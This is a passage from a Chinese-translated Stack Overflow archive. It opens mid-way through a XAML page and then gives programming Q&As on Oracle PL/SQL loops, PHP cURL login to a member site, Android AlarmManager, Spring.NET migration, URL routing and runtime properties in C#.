    <AppBar Height="Auto" Width="1366">
        <Grid>
            <StackPanel x:Name="RightPanel" Orientation="Horizontal" Grid.Column="1" HorizontalAlignment="Right" Margin="0,0,30,0">
                <Button x:Name="Home" Style="{StaticResource HomeAppBarButtonStyle}" Tag="Help" Click="Home_Click"/>
                <Button x:Name="Refresh" Style="{StaticResource RefreshAppBarButtonStyle}" Tag="Refresh"/>
                <Button x:Name="Help" Style="{StaticResource HelpAppBarButtonStyle}" Tag="Home"/>
                <StackPanel.ChildrenTransitions>
                    <TransitionCollection>
                        <AddDeleteThemeTransition/>
                    </TransitionCollection>
                </StackPanel.ChildrenTransitions>
            </StackPanel>
        </Grid>
    </AppBar>
</Page.BottomAppBar>

<Page.TopAppBar>
    <AppBar Height="100">
        <Grid>
            <Image x:Name="Content_Hub" Height="80" Width="80" Source="Assets/ACE-App-Bar-Content-Hub.png" Margin="45,10,0,10" Tapped="Content_Hub_Click" HorizontalAlignment="Left"/>
            <Image x:Name="Market_Research" Height="80" Width="80" Source="Assets/ACE-App-Bar-Market-Research.png" Margin="160,10,0,10" Tapped="MARKET_RESEARCH_Click" HorizontalAlignment="Left"/>
            <Image x:Name="LEAD_CONVERSION" Height="80" Width="80" Source="Assets/ACE-App-Bar-Lead-Conversions.png" Margin="275,10,0,10" HorizontalAlignment="Left"/>
            <StackPanel x:Name="LeftPanel" Orientation="Horizontal" Grid.Column="1" HorizontalAlignment="Right">
                <StackPanel.ChildrenTransitions>
                    <TransitionCollection>
                        <AddDeleteThemeTransition/>
                    </TransitionCollection>
                </StackPanel.ChildrenTransitions>
            </StackPanel>
        </Grid>
    </AppBar>
</Page.TopAppBar>

<UserControl.Resources>

<Style x:Key="GroupItemStyle1" TargetType="GroupItem">
        <Setter Property="IsTabStop" Value="False"/>
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="GroupItem">
                    <Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                        <Grid>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="431*"/>
                                <ColumnDefinition Width="429*"/>
                            </Grid.ColumnDefinitions>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <ContentControl x:Name="HeaderContent" ContentTemplate="{TemplateBinding ContentTemplate}" ContentTransitions="{TemplateBinding ContentTransitions}" ContentTemplateSelector="{TemplateBinding ContentTemplateSelector}" Content="{TemplateBinding Content}" IsTabStop="False" Margin="{TemplateBinding Padding}" TabIndex="0" Grid.Column="1"/>
                            <ItemsControl x:Name="ItemsControl" IsTabStop="False" ItemsSource="{Binding GroupItems}" Grid.Row="1" TabIndex="1" TabNavigation="Once" Grid.Column="1">
                                <ItemsControl.ItemContainerTransitions>
                                    <TransitionCollection>
                                        <AddDeleteThemeTransition/>
                                        <ContentThemeTransition/>
                                        <ReorderThemeTransition/>
                                        <EntranceThemeTransition IsStaggeringEnabled="False"/>
                                    </TransitionCollection>
                                </ItemsControl.ItemContainerTransitions>
                            </ItemsControl>
                             <Image x:Name="Facebook" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-Facebook.jpg"  Tapped="Content_Hub_Click" HorizontalAlignment="Left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,4,0,0"/>           
                            <Image x:Name="Twitter" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-Twitter.jpg" Tapped="Content_Hub_Click" HorizontalAlignment="Left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,44,0,0"/>
                            <Image x:Name="LinkIn" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-Linkedin.jpg"  Tapped="MARKET_RESEARCH_Click" HorizontalAlignment="left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,84,0,0"/>
                            <Image x:Name="RSS" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-RSS.jpg"  HorizontalAlignment="left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,124,0,0"/>
                            <Image x:Name="Google" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-Google.jpg"  HorizontalAlignment="left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,164,0,0"/>
                            <Image x:Name="Youtube" Height="30" Width="30" Source="Assets/Socia-Media/ACE-App-Social-Media-Tiles-Youtube.jpg"  HorizontalAlignment="left"  Grid.Row="1" VerticalAlignment="Top" Margin="0,204,0,0"/>

                            </Grid>
                    </Border>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>

    <CollectionViewSource
        x:Name="groupedItemsViewSource"
        Source="{Binding Groups}"
        IsSourceGrouped="true"
        ItemsPath="TopItems"
        d:Source="{Binding AllGroups, Source={d:DesignInstance Type=data:DataSource, IsDesignTimeCreatable=True}}"/>

    <DataTemplate x:Key="CustomTileItem">
       <Grid> 
            <Grid HorizontalAlignment="Left">
                <Border Background="{StaticResource ListViewItemPlaceholderBackgroundThemeBrush}">
                    <VariableSizedWrapGrid>
                        <Image Source="{Binding Path=Image}" Stretch="UniformToFill" />
                    </VariableSizedWrapGrid>
                </Border>
                <StackPanel VerticalAlignment="Bottom" Background="{StaticResource ListViewItemOverlayBackgroundThemeBrush}">
                    <TextBlock Text="{Binding Title}" Foreground="{StaticResource ListViewItemOverlayForegroundThemeBrush}" FontFamily="Seguo" FontSize="12" TextWrapping="Wrap"  Height="30" Margin="10,3,10,0" VerticalAlignment="top"/>
                </StackPanel>
            </Grid>
        </Grid>
    </DataTemplate>

</UserControl.Resources>

<!--
    This grid acts as a root panel for the page that defines two rows:
    * Row 0 contains the back button and page title
    * Row 1 contains the rest of the page layout -->
<Grid Background="WhiteSmoke">
    <ProgressBar x:Name="pbProgress" IsIndeterminate="True" VerticalAlignment="Top" Value="100"/>
    <Grid Style="{StaticResource LayoutRootStyle}" Margin="0,10,0,0" x:Name="itemGrid">
        <Grid.RowDefinitions>
            <RowDefinition Height="140" />
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <Grid> 
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="Auto"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <Button x:Name="backButton" Click="GoBack" IsEnabled="{Binding Frame.CanGoBack, ElementName=Pageroot}" Style="{StaticResource BackButtonStyle}" Margin="36,0,0,36" Grid.Row="0"/>
            <StackPanel x:Name="Header" Grid.Row="0" Grid.Column="1" >
                <StackPanel Orientation="Horizontal">
                    <Image HorizontalAlignment="Left" Height="Auto" Margin="35,30,0,0" VerticalAlignment="Top" Width="202" Source="Assets/ACE-Logo.png"></Image>
                </StackPanel>
            </StackPanel>
        </Grid>
        <!-- Horizontal scrolling grid used in most view states -->
        <SemanticZoom Name="Zoom" Grid.Row="1">
            <SemanticZoom.ZoomedInView>
                <local:HubItems
                x:Name="itemGridView"
                AutomationProperties.AutomationId="ItemGridView"
                AutomationProperties.Name="Grouped Items"
                Grid.Row="1"
                Margin="0,-3,0,0"
                Padding="116,0,40,20"
                ItemsSource="{Binding Source={StaticResource groupedItemsViewSource}}"
                ItemTemplate="{StaticResource CustomTileItem}"
                SelectionMode="None"
                IsItemClickEnabled="True"
                ItemClick="ItemView_ItemClick" >

                <local:HubItems.ItemsPanel>
                         <ItemsPanelTemplate>
                            <VirtualizingStackPanel Orientation="Horizontal"/>
                        </ItemsPanelTemplate>
                    </local:HubItems.ItemsPanel>
                    <local:HubItems.GroupStyle>
                        <GroupStyle ContainerStyle="{StaticResource GroupItemStyle1}">
                            <GroupStyle.HeaderTemplate>
                              <DataTemplate>
                                    <Grid Margin="-30,0,0,6" x:Name="HeaderGrid">
                                        <Button AutomationProperties.Name="Group Title"  Content="{Binding Title}" Style="{StaticResource TextButtonStyle}"/>
                                    </Grid>
                                </DataTemplate>
                            </GroupStyle.HeaderTemplate>
                            <GroupStyle.Panel>
                                <ItemsPanelTemplate>
                                    <VariableSizedWrapGrid ItemWidth="75" ItemHeight="150" Orientation="Vertical" Margin="0,0,80,0" MaximumRowsOrColumns="3"/>
                                </ItemsPanelTemplate>
                            </GroupStyle.Panel>
                        </GroupStyle>
                    </local:HubItems.GroupStyle>
                </local:HubItems>
            </SemanticZoom.ZoomedInView>
            <SemanticZoom.ZoomedOutView>
                <GridView x:Name="ZoomedOutGV"  VerticalAlignment="Center" HorizontalAlignment="Left" Margin="50,0,0,0" Width="1336" Height="500">
                    <GridView.ItemTemplate>
                        <DataTemplate>
                            <GridView SelectionMode="None">
                                <Border Background="{StaticResource ListViewItemPlaceholderBackgroundThemeBrush}">
                                    <TextBlock Text="{Binding Group.Title}" Width="Auto" Height="Auto" Foreground="Black" HorizontalAlignment="Center" Padding="25,20,25,20" FontWeight="Bold"/>
                                </Border>
                            </GridView>
                        </DataTemplate>
                    </GridView.ItemTemplate>
                    <GridView.ItemsPanel>
                        <ItemsPanelTemplate>
                            <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
                            </StackPanel>
                        </ItemsPanelTemplate>
                    </GridView.ItemsPanel>
                </GridView>
            </SemanticZoom.ZoomedOutView>
        </SemanticZoom>

        <!--   Vertical scrolling list only used when snapped -->
        <ListView
        x:Name="itemListView"
        AutomationProperties.AutomationId="ItemListView"
        AutomationProperties.Name="Grouped Items"
        Visibility="Collapsed"
        Margin="0,135,0,0"
        Padding="10,0,0,60"
        SelectionMode="None"
        IsItemClickEnabled="True"
        ItemClick="ItemView_ItemClick" Grid.RowSpan="2">

            <ListView.GroupStyle>
                <GroupStyle>
                    <GroupStyle.HeaderTemplate>
                        <DataTemplate>
                            <Grid Margin="7,7,0,0">
                                <Button
                                AutomationProperties.Name="Group Title"
                                Content="{Binding Title}"
                                Style="{StaticResource TextButtonStyle}"/>
                            </Grid>
                        </DataTemplate>
                    </GroupStyle.HeaderTemplate>
                </GroupStyle>
            </ListView.GroupStyle>
        </ListView>

        <VisualStateManager.VisualStateGroups>

            <!-- Visual states reflect the application's view state -->
            <VisualStateGroup x:Name="ApplicationViewStates">
                <VisualState x:Name="FullScreenLandscape"/>
                <VisualState x:Name="Filled"/>

                <!-- The entire page respects the narrower 100-pixel margin convention for portrait -->
                <VisualState x:Name="FullScreenPortrait">
                    <Storyboard>
                        <ObjectAnimationUsingKeyFrames Storyboard.TargetName="backButton" Storyboard.TargetProperty="Style">
                            <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PortraitBackButtonStyle}"/>
                        </ObjectAnimationUsingKeyFrames>

                        <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemGridView" Storyboard.TargetProperty="Padding">
                            <DiscreteObjectKeyFrame KeyTime="0" Value="96,0,10,56"/>
                        </ObjectAnimationUsingKeyFrames>
                    </Storyboard>
                </VisualState>

                <!--
                The back button and title have different styles when snapped, and the list representation is substituted
                for the grid displayed in all other view states
            -->
                <VisualState x:Name="Snapped">
                    <Storyboard>
                        <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemListView" Storyboard.TargetProperty="Visibility">
                            <DiscreteObjectKeyFrame KeyTime="0" Value="Visible"/>
                        </ObjectAnimationUsingKeyFrames>
                        <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemGridView" Storyboard.TargetProperty="Visibility">
                            <DiscreteObjectKeyFrame KeyTime="0" Value="Collapsed"/>
                        </ObjectAnimationUsingKeyFrames>
                    </Storyboard>
                </VisualState>
            </VisualStateGroup>
        </VisualStateManager.VisualStateGroups>
    </Grid>
    <Image HorizontalAlignment="Left" Height="100" VerticalAlignment="Top" Width="100"/>
    <Image HorizontalAlignment="Left" Height="100" VerticalAlignment="Top" Width="100"/>
</Grid> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T04:47:18.890

我这样做的一种方法是将所有按钮绑定到同一个命令，然后将[命令参数](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.primitives.buttonbase.commandparameter.aspx)设置为上下文的某个可识别部分。您可以只对命令参数执行一组 if 来确定要做什么。

# oracle - 如何为表的所有列创建一个循环？

> ID：13524412
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:59:33.383
> 
> 标签：oracle, loops, select, plsql

我有一个表 EMPLOYEES，我需要做一个循环，在循环的每一步我使用 dbms_output.put_line(column_name)

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:12:45.750

刚刚找到这个解决方案

```
begin
   for rec in (SELECT column_name 
               FROM all_tab_columns 
               WHERE owner = 'HR'
               AND table_name = 'EMPLOYEES')
   loop
       dbms_output.put_line(rec.column_name);
   end loop;
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:32:06.107

尝试使用光标如下：

```
set serveroutput on;
declare
 var_col1 varchar2(30) ;
 num_col2 number ;  

 CURSOR cur
 is       
  select var_col ,num_col
  from table
  where <conditions>;

begin
   open cur;
   fetch cur into var_col1,num_col2;

   LOOP
    fetch cur into var_col1,num_col2;
       EXIT WHEN cur%NOTFOUND;
       dbms_output.put_line( var_col1||'         '||num_col2);
   END LOOP;

   close cur;  
end; 
```

这是另一个解决方案：

```
set serveroutput on;
begin
  FOR  cur in ( select var_col ,num_col from table where <conditions>)
  LOOP
    dbms_output.put_line(cur.var_col||' = '||cur.num_col);
  END LOOP;
end; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T12:09:12.760

当然，您可以在 table_name 之后使用 WHERE 重写此 SELECT 示例。我没有编译这段代码，但我认为它可以。更改您的属性的 ID_Employee 和名称

```
CREATE OR REPLACE PROCEDURE AAA_TEST
    IS
    BEGIN
      DECLARE 
            v_id NUMBER :=0;
            v_name VARCHAR2(25);

            CURSOR cursorMails IS
                 SELECT Id_Employee,Name FROM EMPLOYEES;  

            BEGIN
                           OPEN cursorMails;

                               LOOP

                                    FETCH cursorMails INTO v_id, v_name;
                                         DBMS_OUTPUT.PUT_LINE('Number of Employee: ' || v_id || ' Name Employee: ' || v_name);
                               EXIT WHEN cursorMails%NOTFOUND;
                               END LOOP;
                           CLOSE cursorMails;
            END;
    END;
    / 
```

# php - Lynda.com 的 CURL 页面

> ID：13524414
> 
> 赞同：1
> 
> 时间：2012-11-23T06:59:38.247
> 
> 标签：php, curl

我是 Lynda.com 的成员，我想从他们的站点获取 HTML 页面并将其保存到我的磁盘上，问题是每当我尝试通过 CURL 获取页面时，我都会得到非会员页面（它问我注册），我不明白为什么我无法获得会员页面:(

我的代码：

```
get_remote_file_to_cache();

function get_remote_file_to_cache()
{

    $the_site = "http://www.lynda.com/AIR-3-0-tutorials/Flex-4-6-and-Mobile-Apps-New-Features/90366-2.html";

    $curl = curl_init();
    $fp = fopen("cache/temp_file.html", "w");
    curl_setopt($curl, CURLOPT_URL, $the_site);
    curl_setopt($curl, CURLOPT_COOKIE, '/cookie.txt');
    curl_setopt($curl, CURLOPT_FILE, $fp);

    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

    $http_headers = array(
        'Host: www.lynda.com',
        'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2',
        'Accept: */*',
        'Accept-Language: en-us,en;q=0.5',
        'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Connection: keep-alive'
    );
    curl_setopt($curl, CURLOPT_HEADER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $http_headers);

    curl_exec($curl);

    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    if($httpCode == 404)
    {
        touch('cache/404_err.txt');
    }
    else
    {
        $contents = curl_exec($curl);
        fwrite($fp, $contents);
    }

    curl_close($curl);
} 
```

我在 Windows 7 上并在 WAMP 上运行。

我不确定的一件事是“cookie.txt”文件是否被读取（不确定路径是否正确，所以我将 cookie.txt 文件放在服务器的根目录以及我正在从中运行此脚本的目录）。

提前致谢！

------------ 通过在线手册找到了一些代码 ---------

```
// $url = page to POST data
// $ref_url = tell the server which page you came from (spoofing)
// $login = true will make a clean cookie-file.
// $proxy = proxy data
// $proxystatus = do you use a proxy ? true/false

function
curl_grab_page($url,$ref_url,$data,$login,$proxy,$proxystatus){
    if($login == 'true') {
        $fp = fopen("ryanCookie.txt", "w");
        fclose($fp);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_COOKIEJAR, "ryanCookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "ryanCookie.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    curl_setopt($ch, CURLOPT_TIMEOUT, 40);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    if ($proxystatus == 'true') {
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, TRUE);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_REFERER, $ref_url);

    curl_setopt($ch, CURLOPT_HEADER, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    ob_start();
    return curl_exec ($ch); // execute the curl command
    ob_end_clean();
    curl_close ($ch);
    unset($ch);
}

echo curl_grab_page("https://www.lynda.com/login/login.aspx", "http://www.lynda.com/", "simple_username=*******&simple_password=*******", "true",  "null", "false")."done!"; 
```

但它仍然不起作用:(这是我获得上述代码的页面：http: [//php.net/manual/en/function.curl-setopt.php](http://php.net/manual/en/function.curl-setopt.php)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:24:08.303

您需要了解 Internet 和 http 的工作原理。你看，当你访问一个网站时，他们通常会给你 cookie 来跟踪你的状态。您也将以非登录成员的身份开始。在您点击登录按钮后，服务器会将您的状态更新为已登录并将此状态存储在服务器站点会话中或使用 cookie 存储在您的浏览器中。

回到您的问题，既然您要访问会员页面，这意味着您需要先执行以下步骤，了解 lynda.com 的工作原理。但是，我下面的步骤相当笼统：

1.  加载登录页面并获取表单信息
2.  使用您的登录信息注入表单信息并将表单发送回服务器
3.  存储从服务器接收到的 cookie
4.  加载成员页面（不要忘记包含步骤 4 中的 cookie 信息）并获取 html

有关更多信息，您可以查看以下资源：

*   [http://www.codingforums.com/showthread.php?t=252335](http://www.codingforums.com/showthread.php?t=252335)
*   [http://simpletest.sourceforge.net/en/browser_documentation.html](http://simpletest.sourceforge.net/en/browser_documentation.html)
*   [https://gist.github.com/3697293](https://gist.github.com/3697293)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:13:28.070

也许您需要发送 Authorization 标头，其中包含您在 HTTP 标头部分中的站点的用户名和密码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T09:36:33.950

要获得会员页面，您需要在网站上登录。为此，您需要：

1.  访问登录页面
2.  发出与浏览器提交登录凭据相同的请求
3.  获取会员页面

或者，您可以尝试在登录后从浏览器中提取 cookie 并在 curl 中使用它们`curl_setopt($ch, CURLOPT_COOKIE, 'a=b;c=d');`，但这可能不起作用，因为网站也可以使用 IP 或会话检查。

# android - 在android中，是否可以在一个应用程序中使用多个具有不同重复值的AlarmManager？

> ID：13524419
> 
> 赞同：0
> 
> 时间：2012-11-23T07:00:12.433
> 
> 标签：android, android-service, alarmmanager, android-alarms, android-2.3-gingerbread

我正在使用 android 2.3 开发移动和平板电脑应用程序**

我想做一些操作，即操作-A 和操作-B。两者都执行一些过程。
我想重复 Operation-A 和 Operation-B 每隔 1 小时执行一次
**Operation-A 在 Operation-B 的 10 分钟之前执行**
Operation-B 当时间为 0.00,1.00,2.00,3.00 时执行。 ...,23.00（我使用的是铁路时间。所以上午或下午不会混淆）。
时间为0.50,1.50,2.50,3.50,....,23.50 时执行操作-A
以上场景在android 中是否可行。
所有这些都是您对上述场景的想法。

我打算使用AlarmManager。AlarmManager 是安卓系统服务。它用于每 1 小时通知一次应用程序。
我计划为 Operation-A 使用一个 AlarmManager，为 Operation-B 使用另一个 AlarmManager。
我的疑问是，在 android 中是否可以在单个应用程序中使用多个具有不同重复值的 AlarmManager？

欢迎您的所有想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:26:38.037

是的，此任务将在具有重复功能的 AlarmManager 的帮助下完成。首先，您需要创建两个接收事件的接收器类。然后需要设置重复报警。

```
private void setAlarm1()
    {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(Calendar.HOUR, 1);
        Intent intent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0,
        intent, PendingIntent.FLAG_CANCEL_CURRENT);

        am.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), 1000*60*60, pendingIntent);
    }
    private void setAlarm2()
    {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(Calendar.MINUTE, 50);
        Intent intent = new Intent(this, AlarmReceiver_1.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0,
        intent, PendingIntent.FLAG_CANCEL_CURRENT);

        am.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), 1000*60*50, pendingIntent);
    } 
```

* * *

```
public class AlarmReceiver extends BroadcastReceiver {

     @Override
     public void onReceive(Context context, Intent intent) {

     }

    }
public class AlarmReceiver_1 extends BroadcastReceiver {

     @Override
     public void onReceive(Context context, Intent intent) {

     }

    } 
```

* * *

在清单中，您需要如下声明类。

```
 <receiver android:name=".AlarmReceiver" />
             <receiver android:name=".AlarmReceiver_1" /> 
```

# c# - 从 Java Spring 迁移到 Spring.NET

> ID：13524421
> 
> 赞同：0
> 
> 时间：2012-11-23T07:00:17.300
> 
> 标签：c#, spring.net, spring-data-jpa

我是一名 .NET 程序员，几乎没有 Java 经验。我继承了一个 Java 项目，并试图手动进行 Java 到 C# 的转换。我知道那里有转换器，但为了获得学习经验，我更愿意手动完成（这个项目并不急于求成）。

因此，我想知道是否有人可以回答以下问题：

1）关于Jpa引用，以下逻辑到底是什么：

```
public interface EbayListingRepository extends JpaSpecificationExecutor<EbayListing>, JpaRepository<EbayListing, Long> { 
```

2) 我已经安装了 Spring.NET 并添加了 Spring.Core、Spring.Data 和 Spring.Data.NHibernate。我正在尝试重现上述“EbayListingRepository”类的逻辑，该类具有以下导入（来自 java 类）：

```
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.JpaSpecificationExecutor;
import org.springframework.stereotype.Repository; 
```

Spring.NET 的 Spring.Data 似乎没有“Data.Domain”或“Data.Jpa”。有人可以在这里解释.NET中的等价物吗？另外，我该如何为 .NET 重现问题 #1 中的代码？

谢谢你的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:13:20.007

JPA 是一个 JSR，我认为没有等效的东西。您可以尝试 iKVM，它可以帮助您将 Java 二进制文件直接转换为 .NET。

# php - 像这样的网站和 facebook 如何跟踪帖子

> ID：13524422
> 
> 赞同：0
> 
> 时间：2012-11-23T07:00:20.897
> 
> 标签：php, asp.net, web

现在我知道有大量的数据库用于跟踪帖子 ID，但每个问题都有一个为其指定的子目录。所以有一个带有 id 的文件夹，然后是问题的标题。这是在发布帖子时动态创建的吗？这些目录中存储了什么？将每个帖子的html代码复制到其中然后为每个问题都有一个特定的文件似乎是一种浪费。这让我觉得内容是动态更新的，但是代码的 html 部分是如何到达那里的？是否有某种模板在某种意义上是“回声”的？显然我很迷茫。我读过一些关于 MVC 的东西，我理解了这个概念，但我很想知道实际的机制以及这些子目录中究竟存储了什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:10:51.773

这一切都是动态的。帖子内容、帖子 ID 和相关表存储在 db 中。您在 URL 中看到的“子目录”并不是包含任何内容的实际子目录，它们在大多数情况下只是 URI 映射。下载 phpBB 或任何电子商务平台的副本并完成编码，它们的工作方式大致相同（显然每个都有自己的方案，就像 stackoverflow 和 Facebook 一样）。

# c# - 使用 propertyBuilder 在运行时将属性添加到现有对象

> ID：13524426
> 
> 赞同：2
> 
> 时间：2012-11-23T07:00:49.173
> 
> 标签：c#, dynamic, reflection, .net-4.0, reflection.emit

一个对象有一些属性，现在在运行时 - 当满足条件时..**我想向这个对象添加新属性。**

“DynamicObject”无法使用，因为**我不会**事先知道属性名称。

我来到了**PropertyBuilder** [http://msdn.microsoft.com/en-us/library/system.reflection.emit.propertybuilder.aspx](http://msdn.microsoft.com/en-us/library/system.reflection.emit.propertybuilder.aspx)

但我找不到有关如何使用propertBuilder 将属性添加到已定义现有类的现有对象的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:06:22.503

您不能在运行时向对象或类型添加*真实*（反射）属性。

如果这里的上下文是数据绑定，那么您可以通过实现一个或多个, , , - 并为额外的属性提供您自己的 s 来实现所有*人工属性。*`ICustomTypeDescriptor``TypeDescriptionProvider``TypeConverter``ITypedList``PropertyDescriptor`

*   `ICustomTypeDescriptor`是每个对象并绑定到该对象
*   `TypeDescriptionProvider`是每个对象或每个类型的，并且与对象是*分开的*
*   `TypeConverter`是每个类型的，特别是由`PropertyGrid`
*   `ITypedList`被列表 ( `IList`) 用来描述子对象的属性

例子：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows.Forms;
static class Program
{
    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        FooConverter.AddProperty("Time", typeof(DateTime));
        FooConverter.AddProperty("Age", typeof(int));
        using (var grid = new PropertyGrid { Dock = DockStyle.Fill, SelectedObject = new Foo() })
        using (var form = new Form { Controls = { grid } })
        {
            Application.Run(form);
        }
    }
}
class FooConverter : ExpandableObjectConverter
{
    private static readonly List<Tuple<string, Type>> customProps = new List<Tuple<string, Type>>();
    public static void AddProperty(string name, Type type)
    {
        lock (customProps) customProps.Add(Tuple.Create(name, type));
    }
    public override PropertyDescriptorCollection GetProperties(ITypeDescriptorContext context, object value, System.Attribute[] attributes)
    {
        var orig = base.GetProperties(context, value, attributes);
        lock(customProps)
        {
            if(customProps.Count == 0) return orig;

            PropertyDescriptor[] props = new PropertyDescriptor[orig.Count + customProps.Count];
            orig.CopyTo(props, 0);
            int i = orig.Count;
            foreach (var prop in customProps)
            {
                props[i++] = new SimpleDescriptor(prop.Item1, prop.Item2);
            }
            return new PropertyDescriptorCollection(props);
        }
    }
    class SimpleDescriptor : PropertyDescriptor
    {
        private readonly Type type;
        public SimpleDescriptor(string name, Type type)
            : base(name, new Attribute[0])
        {
            this.type = type;
        }
        public override Type PropertyType { get { return type;} }
        public override bool SupportsChangeEvents { get { return false; } }
        public override void ResetValue(object component) { SetValue(component, null); }
        public override bool CanResetValue(object component) { return true; }
        public override bool ShouldSerializeValue(object component) { return GetValue(component) != null; }
        public override bool IsReadOnly { get { return false; } }
        public override Type ComponentType { get { return typeof(Foo); } }
        public override object GetValue(object component) { return ((Foo)component).GetExtraValue(Name); }
        public override void SetValue(object component, object value) { ((Foo)component).SetExtraValue(Name, value); }
        public override string Category { get { return "Extra values"; } }
    }
}
[TypeConverter(typeof(FooConverter))]
public class Foo
{
    Dictionary<string, object> extraValues;
    internal object GetExtraValue(string name)
    {
        object value;
        if (extraValues == null || !extraValues.TryGetValue(name, out value)) value = null;
        return value;
    }
    internal void SetExtraValue(string name, object value)
    {
        if (extraValues == null && value != null) extraValues = new Dictionary<string, object>(StringComparer.InvariantCultureIgnoreCase);
        if (value == null) extraValues.Remove(name);
        else extraValues[name] = value;
    }
    public int Id { get; set; }
    public string Name { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-06-15T17:45:02.040

检查此地址 [https://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes(v=vs.110).aspx)

```
using System;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;

class EmitWriteLineDemo {

   public static Type CreateDynamicType() {       
       Type[] ctorParams = new Type[] {typeof(int),
                   typeof(int)};

       AppDomain myDomain = Thread.GetDomain();
       AssemblyName myAsmName = new AssemblyName();
       myAsmName.Name = "MyDynamicAssembly";

       AssemblyBuilder myAsmBuilder = myDomain.DefineDynamicAssembly(
                      myAsmName, 
                      AssemblyBuilderAccess.Run);

       ModuleBuilder pointModule = myAsmBuilder.DefineDynamicModule("PointModule",
                                    "Point.dll");

       TypeBuilder pointTypeBld = pointModule.DefineType("Point",
                                  TypeAttributes.Public);

       FieldBuilder xField = pointTypeBld.DefineField("x", typeof(int),
                                                      FieldAttributes.Public);
       FieldBuilder yField = pointTypeBld.DefineField("y", typeof(int), 
                                                      FieldAttributes.Public);

       Type objType = Type.GetType("System.Object"); 
       ConstructorInfo objCtor = objType.GetConstructor(new Type[0]);

       ConstructorBuilder pointCtor = pointTypeBld.DefineConstructor(
                                   MethodAttributes.Public,
                                   CallingConventions.Standard,
                                   ctorParams);
